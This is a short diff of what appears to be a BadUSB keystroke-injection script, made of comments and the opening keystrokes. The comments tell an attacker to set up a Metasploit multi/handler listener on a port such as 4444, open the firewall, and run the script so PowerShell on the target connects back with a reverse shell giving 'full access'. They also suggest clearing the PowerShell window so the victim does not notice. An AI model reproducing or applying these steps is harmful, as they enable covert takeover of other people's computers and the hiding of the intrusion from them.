@@ -1,5 +1,5 @@
 REM for linux machine to capture the shell use msfconsole aka metasploit then do use exploit/multi/handler then set LHOST & LPORT to maybe 4444 or 9001 for LPORT alow if port not open use, sudo ufw allow 4444 after complete
-REM run, exploit then run the script and should have shell access
+REM after you enter all the ip and port then run, run so that it crates the payload and waits for the request from powershell and when the powershell enters the shell script you will get 100% full access
 REM made by BisKit, another sneaky tip if you end up getting a reverse shell make sure to do command, clear to remove all the powershell shell script so its just no text for them if they open the powershell tab 
 WINDOWS r
 DELAY 200
